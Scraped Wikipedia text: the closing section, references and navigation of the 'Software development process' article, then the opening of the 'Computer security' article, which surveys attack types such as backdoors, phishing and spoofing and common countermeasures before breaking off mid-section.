" are abstract descriptions for evaluating, comparing, and improving the specific process adopted by an organization.



ISO/IEC 12207
 is the international standard describing the method to select, implement, and monitor the life cycle for software.


The 
Capability Maturity Model Integration
 (CMMI) is one of the leading models and is based on best practices. Independent assessments grade organizations on how well they follow their defined processes, not on the quality of those processes or the software produced. CMMI has replaced 
CMM
.


ISO 9000
 describes standards for a formally organized process to manufacture a product and the methods of managing and monitoring progress. Although the standard was originally created for the manufacturing sector, ISO 9000 standards have been applied to software development as well. Like CMMI, certification with ISO 9000 does not guarantee the quality of the end result, only that formalized business processes have been followed.


ISO/IEC 15504
 
Information technology—Process assessment is
 also known as Software Process Improvement Capability Determination (SPICE), is a "framework for the assessment of software processes". This standard is aimed at setting out a clear model for process comparison. SPICE is used much like CMMI. It models processes to manage, control, guide, and monitor software development. This model is then used to measure what a development organization or project team actually does during software development. This information is analyzed to identify weaknesses and drive improvement. It also identifies strengths that can be continued or integrated into common practice for that organization or team.


ISO/IEC 24744
 
Software Engineering—Metamodel for Development Methodologies
, is a power type-based metamodel for software development methodologies.


Soft systems methodology
 - a general method for improving management processes.


Method engineering
 - a general method for improving information system processes.


Further information: 
Process patterns


In practice
[
edit
]


The three basic approaches applied to software development methodology frameworks


A variety of such frameworks have evolved over the years, each with its own recognized strengths and weaknesses. One software development methodology framework is not necessarily suitable for use by all projects. Each of the available methodology frameworks is best suited to specific kinds of projects, based on various technical, organizational, project, and team considerations.
[
1
]




See also
[
edit
]


Systems development life cycle


Computer-aided software engineering
 (some of these tools support specific methodologies)


List of software development philosophies


Outline of software engineering


Software Project Management


Software development


Software development effort estimation


Software release life cycle


Top-down and bottom-up design#Computer science


References
[
edit
]






^ 
a
 
b
 
c
 
d
 
e
 
f
 
g
 
"Selecting a development approach"
 
(PDF)
. 
Centers for Medicare & Medicaid Services (CMS) Office of Information Service
. United States Department of Health and Human Services (HHS). March 27, 2008 [Original Issuance: February 17, 2005]. Archived from 
the original
 
(PDF)
 on June 20, 2012
. Retrieved 
October 27,
 2008
.




^ 
a
 
b
 
Geoffrey Elliott (2004). 
Global Business Information Technology: an integrated systems approach
. Pearson Education. p. 87.




^
 
Suryanarayana, Girish (2015). 
"Software Process versus Design Quality: Tug of War?"
. 
IEEE Software
. 
32
 (4): 7–11. 
doi
:
10.1109/MS.2015.87
.




^
 
Paul M. Duvall; Steve Matyas; 
Andrew Glover
 (2007). 
Continuous Integration: Improving Software Quality and Reducing Risk
. 
Addison-Wesley Professional
. 
ISBN
 
978-0-321-33638-5
.




^
 
Booch, Grady
 (1991). 
Object Oriented Design: With Applications
. 
Benjamin Cummings
. p. 209. 
ISBN
 
9780805300918
. Retrieved 
August 18,
 2014
.




^ 
a
 
b
 
Whitten, Jeffrey L.
; 
Lonnie D. Bentley
, 
Kevin C. Dittman
. (2003). 
Systems Analysis and Design Methods
. 6th edition. 
ISBN
 
0-256-19906-X
.




^
 
Markus Rerych. 
"Wasserfallmodell > Entstehungskontext"
. 
Institut für Gestaltungs- und Wirkungsforschung, TU-Wien
 (in German)
. Retrieved 
November 28,
 2007
.




^
 
Conrad Weisert. 
"Waterfall methodology: there's no such thing!"
. Archived from 
the original
 on August 2, 2022.




^
 
Barry Boehm
 (August 1986). 
"A Spiral Model of Software Development and Enhancement"
. 
ACM SIGSOFT Software Engineering Notes
. 
11
 (4). 
Association for Computing Machinery
: 14–24. 
doi
:
10.1145/12944.12948
. 
S2CID
 
1781829
.




^
 
Richard H. Thayer; 
Barry W. Boehm
 (1986). 
Tutorial: software engineering project management
. Computer Society Press of the IEEE. p. 130.




^
 
Barry W. Boehm
 (2000). 
Software cost estimation with Cocomo II: Volume 1
.




^
 
"Foreword by Jason Fried | Shape Up"
. 
basecamp.com
. Retrieved 
September 11,
 2022
.




^
 
"Is Shape Up just a nice theory?"
. 
Curious Lab
. Retrieved 
September 12,
 2022
.




^
 
Lübke, Daniel; van Lessen, Tammo (2016). "Modeling Test Cases in BPMN for Behavior-Driven Development". 
IEEE Software
. 
33
 (5): 15–21. 
doi
:
10.1109/MS.2016.117
. 
S2CID
 
14539297
.






External links
[
edit
]








Wikimedia Commons has media related to 
Software development methodology
.




Selecting a development approach
 at cms.hhs.gov.


Gerhard Fischer, 
"The Software Technology of the 21st Century: From Software Reuse to Collaborative Software Design"
, 2001


v
t
e
Software engineering
Fields


Computer programming


DevOps


Empirical software engineering


Experimental software engineering


Formal methods


Requirements engineering


Search-based software engineering


Site reliability engineering


Social software engineering


Software deployment


Software design


Software maintenance


Software testing


Systems analysis


Concepts


Abstraction


Component-based software engineering


Software compatibility


Backward compatibility


Compatibility layer


Compatibility mode


Forward compatibility


Software incompatibility


Data modeling


Enterprise architecture


Functional specification


Modeling language


Programming paradigm


Software


Software archaeology


Software architecture


Software configuration management


Software development process/methodology


Software quality


Software quality assurance


Software verification and validation


Software system


Structured analysis


Essential analysis


CI/CD


Orientations


Agile


Aspect-oriented


Object orientation


Ontology


Service orientation


SDLC


Models
Developmental


Agile


EUP


Executable UML


Incremental model


Iterative model


Prototype model


RAD


UP


Scrum


Spiral model


V-model


Waterfall model


XP


Model-driven engineering


Round-trip engineering


Other


SPICE


CMMI


Data model


ER model


Function model


Information model


Metamodeling


Object model


Systems model


View model


Languages


IDEF


UML


USL


SysML


Related fields


Computer science


Computer engineering


Information science


Project management


Risk management


Systems engineering




 
Commons


 
Category












Retrieved from "
https://en.wikipedia.org/w/index.php?title=Software_development_process&oldid=1244910296
"


Categories
: 
Software development process
Methodology
Software engineering
Hidden categories: 
CS1 German-language sources (de)
Articles with short description
Short description matches Wikidata
Use mdy dates from December 2023
Articles needing additional references from December 2010
All articles needing additional references
Use American English from April 2022
All Wikipedia articles written in American English
All articles with unsourced statements
Articles with unsourced statements from September 2020
All articles with specifically marked weasel-worded phrases
Articles with specifically marked weasel-worded phrases from January 2021
Commons category link is on Wikidata











From Wikipedia, the free encyclopedia




(Redirected from 
Software development security
)


Protection of computer systems from information disclosure, theft or damage






Part of a series on
Computer hacking


History


Phreaking


Cryptovirology


Hacking of consumer electronics


List of hackers




Hacker culture
 and 
ethic


Hackathon


Hacker Manifesto


Hackerspace


Hacktivism


Maker culture


Types of 
hackers


Black hat


Grey hat


White hat




Conferences


Black Hat Briefings


Chaos Communication Congress


DEF CON


Hackers on Planet Earth


Security BSides


ShmooCon


Summercon




Computer crime


Crimeware


List of computer criminals


Script kiddie




Hacking tools


Exploit


forensics-focused operating systems


Payload


Social engineering


Vulnerability




Practice sites


HackThisSite


Zone-H




Malware


Rootkit


Backdoor


Trojan horse


Virus


Worm


Spyware


Ransomware


Logic bomb


Botnet


Keystroke logging


HIDS


Web shell


RCE


Infostealer




Computer security


Application security


Cloud computing security


Network security




Groups


Anonymous


Chaos Computer Club


Homebrew Computer Club
 (defunct)


Legion of Doom
 (defunct)


LulzSec
 (defunct)


Masters of Deception
 (defunct)


Red team
 / 
Blue team




Publications


2600: The Hacker Quarterly


Hacker News


Nuts and Volts


Phrack


v
t
e


Operating systems

Common features


Process management


Interrupts


Memory management


File system


Device drivers


Networking


Security


Input/output


v
t
e


An example of a physical security measure: a metal lock on the back of a personal computer to prevent hardware tampering.


Computer security
 (also 
cybersecurity
, 
digital security
, or 
information technology (IT) security
) is the protection of 
computer software
, 
systems
 and 
networks
 from 
threats
 that may result in unauthorized information disclosure, theft of (or damage to) 
hardware
, 
software
, or 
data
, as well as from the disruption or misdirection of the 
services
 they provide.
[
1
]
[
2
]


The field is significant due to the expanded reliance on 
computer systems
, the 
Internet
,
[
3
]
 and 
wireless network standards
. It is also significant due to the growth of 
smart devices
, including 
smartphones
, 
televisions
, and the various 
devices
 that constitute the 
Internet of things
 (IoT). Cybersecurity is one of the most significant new challenges facing the contemporary world, due to both the complexity of 
information systems
 and the societies they support. Security is of especially high importance for systems that govern large-scale systems with far-reaching physical effects, such as 
power distribution
, 
elections
, and 
finance
.
[
4
]
[
5
]


While many aspects of computer security involve digital security such as electronic 
passwords
 and 
encryption
, 
physical security
 measures such as 
metal locks
 are still used to prevent unauthorized tampering. IT security is not a perfect subset of 
information security
, thus does not fit completely into the 
security convergence
 schema.





Vulnerabilities and attacks
[
edit
]


Main article: 
Vulnerability (computing)


A vulnerability refers to a flaw in the structure, execution, functioning, or internal oversight of a computer or system that compromises its security. Most of the vulnerabilities that have been discovered are documented in the 
Common Vulnerabilities and Exposures
 (CVE) database.
[
6
]
 An 
exploitable
 vulnerability is one for which at least one working 
attack
 or 
exploit
 exists.
[
7
]
 Actors maliciously seeking vulnerabilities are known as 
threats
. Vulnerabilities can be researched, reverse-engineered, hunted, or exploited using 
automated tools
 or customized scripts.
[
8
]
[
9
]


Various people or parties are vulnerable to cyber attacks; however, different groups are likely to experience different types of attacks more than others.
[
10
]


In April 2023, the 
United Kingdom
 Department for Science, Innovation & Technology released a report on cyber attacks over the last 12 months.
[
11
]
 They surveyed 2,263 UK businesses, 1,174 UK registered charities, and 554 education institutions. The research found that "32% of businesses and 24% of charities overall recall any breaches or attacks from the last 12 months." These figures were much higher for "medium businesses (59%), large businesses (69%), and high-income charities with £500,000 or more in annual income (56%)."
[
11
]
 Yet, although medium or large businesses are more often the victims, since larger companies have generally improved their security over the last decade, 
small and midsize businesses
 (SMBs) have also become increasingly vulnerable as they often "do not have advanced tools to defend the business."
[
10
]
 SMBs are most likely to be affected by malware, ransomware, phishing, 
man-in-the-middle attacks
, and Denial-of Service (DoS) Attacks.
[
10
]


Normal internet users are most likely to be affected by untargeted cyberattacks.
[
12
]
 These are where attackers indiscriminately target as many devices, services, or users as possible. They do this using techniques that take advantage of the openness of the Internet. These strategies mostly include 
phishing
, 
ransomware
, 
water holing
 and scanning.
[
12
]


To secure a computer system, it is important to understand the attacks that can be made against it, and these 
threats
 can typically be classified into one of the following categories:



Backdoor
[
edit
]


A 
backdoor
 in a computer system, a 
cryptosystem
, or an 
algorithm
 is any secret method of bypassing normal 
authentication
 or security controls. These weaknesses may exist for many reasons, including original design or poor configuration.
[
13
]
 Due to the nature of backdoors, they are of greater concern to companies and databases as opposed to individuals.

Backdoors may be added by an authorized party to allow some legitimate access or by an attacker for malicious reasons. 
Criminals
 often use 
malware
 to install backdoors, giving them remote administrative access to a system.
[
14
]
 Once they have access, cybercriminals can "modify files, steal personal information, install unwanted software, and even take control of the entire computer."
[
14
]


Backdoors can be very hard to detect and are usually discovered by someone who has access to the application source code or intimate knowledge of the 
operating system
 of the computer.



Denial-of-service attack
[
edit
]


Denial-of-service attacks
 (DoS) are designed to make a machine or network resource unavailable to its intended users.
[
15
]
 Attackers can deny service to individual victims, such as by deliberately entering a wrong password enough consecutive times to cause the victim's account to be locked, or they may overload the capabilities of a machine or network and block all users at once. While a network attack from a single 
IP address
 can be blocked by adding a new firewall rule, many forms of 
distributed denial-of-service
 (DDoS) attacks are possible, where the attack comes from a large number of points. In this case, defending against these attacks is much more difficult. Such attacks can originate from the 
zombie computers
 of a 
botnet
 or from a range of other possible techniques, including 
distributed reflective denial-of-service
 (DRDoS), where innocent systems are fooled into sending traffic to the victim.
[
15
]
 With such attacks, the amplification factor makes the attack easier for the attacker because they have to use little bandwidth themselves. To understand why attackers may carry out these attacks, see the 'attacker motivation' section.



Direct-access attacks
[
edit
]


A direct-access attack is when an unauthorized user (an attacker) gains physical access to a computer, most likely to directly copy data from it or steal information.
[
16
]
 Attackers may also compromise security by making operating system modifications, installing 
software worms
, 
keyloggers
, 
covert listening devices
 or using wireless microphones. Even when the system is protected by standard security measures, these may be bypassed by booting another operating system or tool from a 
CD-ROM
 or other bootable media. 
Disk encryption
 and the 
Trusted Platform Module
 standard are designed to prevent these attacks.

Direct service attackers are related in concept to 
direct memory attacks
 which allow an attacker to gain direct access to a computer's memory.
[
17
]
 The attacks "take advantage of a feature of modern computers that allows certain devices, such as external hard drives, graphics cards, or network cards, to access the computer's memory directly."
[
17
]




Eavesdropping
[
edit
]


Eavesdropping
 is the act of surreptitiously listening to a private computer conversation (communication), usually between hosts on a network. It typically occurs when a user connects to a network where traffic is not secured or encrypted and sends sensitive business data to a colleague, which, when listened to by an attacker, could be exploited.
[
18
]
 Data transmitted across an "open network" allows an attacker to exploit a vulnerability and intercept it via various methods.

Unlike 
malware
, direct-access attacks, or other forms of cyber attacks, eavesdropping attacks are unlikely to negatively affect the performance of networks or devices, making them difficult to notice.
[
18
]
 In fact, "the attacker does not need to have any ongoing connection to the software at all. The attacker can insert the software onto a compromised device, perhaps by direct insertion or perhaps by a virus or other malware, and then come back some time later to retrieve any data that is found or trigger the software to send the data at some determined time."
[
19
]


Using a 
virtual private network
 (VPN), which encrypts data between two points, is one of the most common forms of protection against eavesdropping. Using the best form of encryption possible for wireless networks is best practice, as well as using 
HTTPS
 instead of an unencrypted 
HTTP
.
[
20
]


Programs such as 
Carnivore
 and 
NarusInSight
 have been used by the 
Federal Bureau of Investigation
 (FBI) and NSA to eavesdrop on the systems of 
internet service providers
. Even machines that operate as a closed system (i.e., with no contact with the outside world) can be eavesdropped upon by monitoring the faint 
electromagnetic
 transmissions generated by the hardware. 
TEMPEST
 is a specification by the NSA referring to these attacks.



Malware
[
edit
]


Malicious software (
malware
) is any software code or computer program "intentionally written to harm a computer system or its users."
[
21
]
 Once present on a computer, it can leak sensitive details such as personal information, business information and passwords, can give control of the system to the attacker, and can corrupt or delete data permanently.
[
22
]
 Another type of malware is 
ransomware
, which is when "malware installs itself onto a victim's machine, encrypts their files, and then turns around and demands a ransom (usually in 
Bitcoin
) to return that data to the user."
[
23
]


Types of malware include some of the following:



Viruses
 are a specific type of malware, and are normally a malicious code that hijacks software with the intention to "do damage and spread copies of itself." Copies are made with the aim to spread to other programs on a computer.
[
21
]


Worms
 are similar to viruses, however viruses can only function when a user runs (opens) a compromised program. Worms are self-replicating malware that spread between programs, apps and devices 
without
 the need for human interaction.
[
21
]


Trojan horses
 are programs that pretend to be helpful or hide themselves within desired or legitimate software to "trick users into installing them." Once installed, a RAT (remote access trojan) can create a secret backdoor on the affected device to cause damage.
[
21
]


Spyware
 is a type of malware that secretly gathers information from an infected computer and transmits the sensitive information back to the attacker. One of the most common forms of spyware are 
keyloggers
, which record all of a user's keyboard inputs/keystrokes, to "allow hackers to harvest usernames, passwords, bank account and credit card numbers."
[
21
]


Scareware
, as the name suggests, is a form of 
malware
 which uses 
social engineering
 (manipulation) to scare, 
shock
, trigger 
anxiety
, or suggest the perception of a threat in order to manipulate users into buying or installing 
unwanted software
. These attacks often begin with a "sudden pop-up with an urgent message, usually warning the user that they've broken the law or their device has a virus."
[
21
]


Man-in-the-middle attacks
[
edit
]


Man-in-the-middle attacks
 (MITM) involve a malicious attacker trying to intercept, surveil or modify communications between two parties by spoofing one or both party's identities and injecting themselves in-between.
[
24
]
 Types of MITM attacks include:



IP address spoofing is where the attacker hijacks routing protocols to reroute the targets traffic to a vulnerable network node for traffic interception or injection.


Message spoofing (via email, SMS or OTT messaging) is where the attacker spoofs the identity or carrier service while the target is using messaging protocols like email, SMS or OTT (IP-based) messaging apps. The attacker can then monitor conversations, launch social attacks or trigger zero-day-vulnerabilities to allow for further attacks.


WiFi SSID spoofing is where the attacker simulates a WIFI base station SSID to capture and modify internet traffic and transactions. The attacker can also use local network addressing and reduced network defenses to penetrate the target's firewall by breaching known vulnerabilities. Sometimes known as a Pineapple attack thanks to a popular device. See also 
Malicious association
.


DNS spoofing
 is where attackers hijack domain name assignments to redirect traffic to systems under the attackers control, in order to surveil traffic or launch other attacks.


SSL hijacking, typically coupled with another media-level MITM attack, is where the attacker spoofs the SSL authentication and encryption protocol by way of Certificate Authority injection in order to decrypt, surveil and modify traffic. See also 
TLS interception
[
24
]


Multi-vector, polymorphic attacks
[
edit
]


Surfacing in 2017, a new class of multi-vector,
[
25
]
 polymorphic
[
26
]
 cyber threats combine several types of attacks and change form to avoid cybersecurity controls as they spread.

Multi-vector polymorphic attacks, as the name describes, are both multi-vectored and polymorphic.
[
27
]
 Firstly, they are a singular attack that involves multiple methods of attack. In this sense, they are “multi-vectored (i.e. the attack can use multiple means of propagation such as via the Web, email and applications." However,  they are also multi-staged, meaning that “they can infiltrate networks and move laterally inside the network.”
[
27
]
 The attacks can be polymorphic, meaning that the cyberattacks used such as viruses, worms or trojans “constantly change (“morph”) making it nearly impossible to detect them using signature-based defences.”
[
27
]




Phishing
[
edit
]


An example of a phishing email, disguised as an official 
email
 from a (fictional) bank. The sender is attempting to trick the recipient into revealing confidential information by confirming it at the phisher's website. Note the misspelling of the words 
received
 and 
discrepancy
 as rec
ie
ved and discrep
e
ncy, respectively. Although the 
URL
 of the bank's 
webpage
 appears to be legitimate, the hyperlink points at the phisher's webpage.


Phishing
 is the attempt of acquiring sensitive information such as usernames, passwords, and credit card details directly from users by deceiving the users.
[
28
]
 Phishing is typically carried out by 
email spoofing
, 
instant messaging
, 
text message
, or on a 
phone
 call. They often direct users to enter details at a fake website whose 
look and feel
 are almost identical to the legitimate one.
[
29
]
 The fake website often asks for personal information, such as login details and passwords. This information can then be used to gain access to the individual's real account on the real website.

Preying on a victim's trust, phishing can be classified as a form of 
social engineering
. Attackers can use creative ways to gain access to real accounts. A common scam is for attackers to send fake electronic invoices
[
30
]
 to individuals showing that they recently purchased music, apps, or others, and instructing them to click on a link if the purchases were not authorized. A more strategic type of phishing is spear-phishing which leverages personal or organization-specific details to make the attacker appear like a trusted source. Spear-phishing attacks target specific individuals, rather than the broad net cast by phishing attempts.
[
31
]




Privilege escalation
[
edit
]


Privilege escalation
 describes a situation where an attacker with some level of restricted access is able to, without authorization, elevate their privileges or access level.
[
32
]
 For example, a standard computer user may be able to exploit a 
vulnerability
 in the system to gain access to restricted data; or even become 
root
 and have full unrestricted access to a system. The severity of attacks can range from attacks simply sending an unsolicited email to a 
ransomware attack
 on large amounts of data. Privilege escalation usually starts with 
social engineering
 techniques, often 
phishing
.
[
32
]


Privilege escalation can be separated into two strategies, horizontal and vertical privilege escalation:



Horizontal escalation (or account takeover) is where an attacker gains access to a normal user account that has relatively low-level privileges. This may be through stealing the user's username and password. Once they have access, they have gained a “foothold,” and using this foothold the attacker then may move around the network of users at this same lower level, gaining access to information of this similar privilege.
[
32
]


Vertical escalation however targets people higher up in a company and often with more administrative power, such as an employee in IT with a higher privilege. Using this privileged account will then enable the attacker to invade other accounts.
[
32
]


Side-channel attack
[
edit
]


Main article: 
Side-channel attack


Any computational system affects its environment in some form. This effect it has on its environment can range from electromagnetic radiation, to residual effect on RAM cells which as a consequence make a 
Cold boot attack
 possible, to hardware implementation faults that allow for access or guessing of other values that normally should be inaccessible. In Side-channel attack scenarios, the attacker would gather such information about a system or network to guess its internal state and as a result access the information which is assumed by the victim to be secure.



Social engineering
[
edit
]


Social engineering
, in the context of computer security, aims to convince a user to disclose secrets such as passwords, card numbers, etc. or grant physical access by, for example, impersonating a senior executive, bank, a contractor, or a customer.
[
33
]
 This generally involves exploiting people's trust, and relying on their 
cognitive biases
. A common scam involves emails sent to accounting and finance department personnel, impersonating their CEO and urgently requesting some action. One of the main techniques of social engineering are 
phishing
 attacks.

In early 2016, the 
FBI
 reported that such 
business email compromise
 (BEC) scams had cost US businesses more than $2 billion in about two years.
[
34
]


In May 2016, the 
Milwaukee Bucks
 
NBA
 team was the victim of this type of cyber scam with a perpetrator impersonating the team's president 
Peter Feigin
, resulting in the handover of all the team's employees' 2015 
W-2
 tax forms.
[
35
]




Spoofing
[
edit
]


Main article: 
Spoofing attack


Spoofing is an act of pretending to be a valid entity through the falsification of data (such as an IP address or username), in order to gain access to information or resources that one is otherwise unauthorized to obtain. Spoofing is closely related to 
phishing
.
[
36
]
[
37
]
 There are several types of spoofing, including:



Email spoofing
, is where an attacker forges the sending (
From
, or source) address of an email.


IP address spoofing
, where an attacker alters the source IP address in a 
network packet
 to hide their identity or impersonate another computing system.


MAC spoofing
, where an attacker modifies the 
Media Access Control (MAC) address
 of their 
network interface controller
 to obscure their identity, or to pose as another.


Biometric
 spoofing, where an attacker produces a fake biometric sample to pose as another user.
[
38
]


Address Resolution Protocol
 (ARP) spoofing, where an attacker sends spoofed address resolution protocol onto a 
local area network
 to associate their 
Media Access Control address
 with a different host's IP address. This causes data to be sent to the attacker rather than the intended host.


In 2018, the cybersecurity firm 
Trellix
 published research on the life-threatening risk of spoofing in the healthcare industry.
[
39
]




Tampering
[
edit
]


Tampering
 describes a 
malicious modification
 or alteration of data. It is an intentional but unauthorized act resulting in the modification of a system, components of systems, its intended behavior, or data. So-called 
Evil Maid attacks
 and security services planting of 
surveillance
 capability into routers are examples.
[
40
]




HTML smuggling
[
edit
]


HTML
 smuggling allows an attacker to "smuggle" a malicious code inside a particular HTML or web page.
[
41
]
 
HTML
 files can carry payloads concealed as benign, inert data in order to defeat 
content filters
. These payloads can be reconstructed on the other side of the filter.
[
42
]


When a target user opens the HTML, the malicious code is activated; the web browser then "decodes" the script, which then unleashes the malware onto the target's device.
[
41
]




Information security practices
[
edit
]


Employee behavior can have a big impact on 
information security
 in organizations. Cultural concepts can help different segments of the organization work effectively or work against effectiveness toward information security within an organization. Information security culture is the "...totality of patterns of behavior in an organization that contributes to the protection of information of all kinds."
[
43
]


Andersson and Reimers (2014) found that employees often do not see themselves as part of their organization's information security effort and often take actions that impede organizational changes.
[
44
]
 Indeed, the Verizon Data Breach Investigations Report 2020, which examined 3,950 security breaches, discovered 30% of cybersecurity incidents involved internal actors within a company.
[
45
]
 Research shows information security culture needs to be improved continuously. In "Information Security Culture from Analysis to Change", authors commented, "It's a never-ending process, a cycle of evaluation and change or maintenance." To manage the information security culture, five steps should be taken: pre-evaluation, strategic planning, operative planning, implementation, and post-evaluation.
[
46
]




Pre-evaluation: To identify the awareness of information security within employees and to analyze the current security policies.


Strategic planning: To come up with a better awareness program, clear targets need to be set. Assembling a team of skilled professionals is helpful to achieve it.


Operative planning: A good security culture can be established based on internal communication, management buy-in, security awareness and a training program.
[
46
]


Implementation: Four stages should be used to implement the information security culture. They are:


Commitment of the management


Communication with organizational members


Courses for all organizational members


Commitment of the employees
[
46
]


Post-evaluation: To assess the success of the planning and implementation, and to identify unresolved areas of concern.


Computer protection (countermeasures)
[
edit
]


In computer security, a 
countermeasure
 is an action, device, procedure or technique that reduces a threat, a vulnerability, or an 
attack
 by eliminating or preventing it, by minimizing the harm it can cause, or by discovering and reporting it so that corrective action can be taken.
[
47
]
[
48
]
[
49
]


Some common countermeasures are listed in the following sections:



Security by design
[
edit
]


Main article: 
Secure by design


Security by design, or alternately secure by design, means that the software has been designed from the ground up to be secure. In this case, security is considered a main feature.

The UK government's National Cyber Security Centre separates secure cyber design principles into five sections:
[
50
]




Before a secure system is created or updated, companies should ensure they understand the fundamentals and the context around the system they are trying to create and identify any weaknesses in the system.


Companies should design and centre their security around techniques and defences which make attacking their data or systems inherently more challenging for attackers.


Companies should ensure that their core services that rely on technology are protected so that the systems are essentially never down.


Although systems can be created which are safe against a multitude of attacks, that does not mean that attacks will not be attempted. Despite one's security, all companies' systems should aim to be able to detect and spot attacks as soon as they occur to ensure the most effective response to them.


Companies should create secure systems designed so that any attack that is "successful" has minimal severity.


These design principles of security by design can include some of the following techniques:



The 
principle of least privilege
, where each part of the system has only the privileges that are needed for its function. That way, even if an 
attacker
 gains access to that part, they only have limited access to the whole system.


Automated theorem proving
 to prove the correctness of crucial software subsystems.


Code reviews
 and 
unit testing
, approaches to make modules more secure where formal correctness proofs are not possible.


Defense in depth
, where the design is such that more than one subsystem needs to be violated to compromise the integrity of the system and the information it holds.


Default secure settings, and design to 
fail secure
 rather than 
fail insecure
 (see 
fail-safe
 for the equivalent in 
safety engineering
). Ideally, a secure system should require a deliberate, conscious, knowledgeable and free decision on the part of legitimate authorities in order to make it insecure.


Audit trails
 track system activity so that when a security breach occurs, the mechanism and extent of the breach can be determined. Storing audit trails remotely, where they can only be appended to, can keep intruders from covering their tracks.


Full disclosure
 of all vulnerabilities, to ensure that the 
window of vulnerability
 is kept as short as possible when bugs are discovered.


Security architecture
[
edit
]


Security architecture can be defined as the "practice of designing computer systems to achieve security goals."
[
51
]
 These goals have overlap with the principles of "security by design" explored above, including to "make initial compromise of the system difficult," and to "limit the impact of any compromise."
[
51
]
 In practice, the role of a security architect would be to ensure the structure of a system reinforces the security of the system, and that new changes are safe and meet the security requirements of the organization.
[
52
]
[
53
]


Similarly, Techopedia defines security architecture as "a unified security design that addresses the necessities and potential risks involved in a certain scenario or environment. It also specifies when and where to apply security controls. The design process is generally reproducible." The key attributes of security architecture are:
[
54
]




the relationship of different components and how they depend on each other.


determination of controls based on risk assessment, good practices, finances, and legal matters.


the standardization of controls.


Practicing security architecture provides the right foundation to systematically address business, IT and security concerns in an organization.



Security measures
[
edit
]


A state of computer security is the conceptual ideal, attained by the use of three processes: threat prevention, detection, and response. These processes are based on various policies and system components, which include the following:



Limiting the access of individuals using 
user account
 
access controls
 and using 
cryptography
 can protect systems files and data, respectively.


Firewalls
 are by far the most common prevention systems from a network security perspective as they can (if properly configured) shield access to internal network services and block certain kinds of attacks through packet filtering. Firewalls can be both hardware and software-based. Firewalls monitor and control incoming and outgoing traffic of a computer network and establish a barrier between a trusted network and an untrusted network.
[
55
]


Intrusion Detection System
 (IDS) products are designed to detect network attacks in-progress and assist in post-attack 
forensics
, while 
audit trails
 and 
logs
 serve a similar function for individual systems.


Response
 is necessarily defined by the assessed security requirements of an individual system and may cover the range from simple upgrade of protections to notification of 
legal
 authorities, counter-attacks, and the like. In some special cases, the complete destruction of the compromised system is favored, as it may happen that not all the compromised resources are detected.


Cyber security awareness training to cope with cyber threats and attacks.
[
56
]


Forward web 
proxy
 solutions can prevent the client to visit malicious web pages and inspect the content before downloading to the client machines.


Today, computer security consists mainly of preventive measures, like 
firewalls
 or an 
exit procedure
. A firewall can be defined as a way of filtering network data between a host or a network and another network, such as the 
Internet
. They can be implemented as software running on the machine, hooking into the 
network stack
 (or, in the case of most 
UNIX
-based operating systems such as 
Linux
, built into the operating system 
kernel
) to provide real-time filtering and blocking.
[
55
]
 Another implementation is a so-called 
physical firewall
, which consists of a separate machine filtering network traffic. Firewalls are common amongst machines that are permanently connected to the Internet.

Some organizations are turning to 
big data
 platforms, such as 
Apache Hadoop
, to extend data accessibility and 
machine learning
 to detect 
advanced persistent threats
.
[
57
]


In order to ensure adequate security, the confidentiality, integrity and availability of a network, better known as the CIA triad, must be protected and is considered the foundation to information security.
[
58
]
 To achieve those objectives, administrative, physical and technical security measures should be employed. The amount of security afforded to an asset can only be determined when its value is known.
[
59
]




Vulnerability management
[
edit
]


Main article: 
Vulnerability management


Vulnerability management is the cycle of identifying, fixing or mitigating 
vulnerabilities
,
[
60
]
 especially in software and 
firmware
. Vulnerability management is integral to computer security and 
network security
.

Vulnerabilities can be discovered with a 
vulnerability scanner
, which analyzes a computer system in search of known vulnerabilities,
[
61
]
 such as 
open ports
, insecure software configuration, and susceptibility to 
malware
.  In order for these tools to be effective, they must be kept up to date with every new update the vendor release.  Typically, these updates will scan for the new vulnerabilities that were introduced recently.

Beyond vulnerability scanning, many organizations contract outside security auditors to run regular 
penetration tests
 against their systems to identify vulnerabilities. In some sectors, this is a contractual requirement.
[
62
]




Reducing vulnerabilities
[
edit
]


The act of assessing and reducing vulnerabilities to cyber attacks is commonly referred to as 
information technology security assessments
. They aim to assess systems for risk and to predict and test for their vulnerabilities. While 
formal verification
 of the correctness of computer systems is possible,
[
63
]
[
64
]
 it is not yet common. Operating systems formally verified include 
seL4
,
[
65
]
 and 
SYSGO
's 
PikeOS
[
66
]
[
67
]
 – but these make up a very small percentage of the market.

It is possible to reduce an attacker's chances by keeping systems up to date with security patches and updates and by hiring people with expertise in security. Large companies with significant threats can hire Security Operations Centre (SOC) Analysts. These are specialists in cyber defences, with their role ranging from "conducting threat analysis to investigating reports of any new issues and preparing and testing disaster recovery plans."
[
68
]


Whilst no measures can completely guarantee the prevention of an attack, these measures can help mitigate the damage of possible attacks. The effects of data loss/damage can be also reduced by careful 
backing up
 and 
insurance
.

Outside of formal assessments, there are various methods of reducing vulnerabilities. 
Two factor authentication
 is a method for mitigating unauthorized access to a system or sensitive information.
[
69
]
 It requires 
something you know:
 a password or PIN, and 
something you have
: a card, dongle, cellphone, or another piece of hardware. This increases security as an unauthorized person needs both of these to gain access.

Protecting against social engineering and direct computer access (physical) attacks can only happen by non-computer means, which can be difficult to enforce, relative to the sensitivity of the information. Training is often involved to help mitigate this risk by improving people's knowledge of how to protect themselves and by increasing people's awareness of threats.
[
70
]
 However, even in highly disciplined environments (e.g. military organizations), social engineering attacks can still be difficult to foresee and prevent.

Inoculation, derived from 
inoculation theory
, seeks to prevent social engineering and other fraudulent tricks and traps by instilling a resistance to persuasion attempts through exposure to similar or related attempts.
[
71
]




Hardware protection mechanisms
[
edit
]


See also: 
Computer security compromised by hardware failure


Hardware-based or assisted computer security also offers an alternative to software-only computer security. Using devices and methods such as 
dongles
, 
trusted platform modules
, intrusion-aware cases, drive locks, disabling USB ports, and mobile-enabled access may be considered more secure due to the physical access (or sophisticated backdoor access) required in order to be compromised. Each of these is covered in more detail below.



USB 
dongles
 are typically used in software licensing schemes to unlock software capabilities,
[
72
]
 but they can also be seen as a way to prevent unauthorized access to a computer or other device's software. The dongle, or key, essentially creates a secure encrypted tunnel between the software application and the key. The principle is that an encryption scheme on the dongle, such as 
Advanced Encryption Standard
 (AES) provides a stronger measure of security since it is harder to hack and replicate the dongle than to simply copy the native software to another machine and use it. Another security application for dongles is to use them for accessing web-based content such as cloud software or 
Virtual Private Networks
 (VPNs).
[
73
]
 In addition, a USB dongle can be configured to lock or unlock a computer.
[
74
]


Trusted platform modules
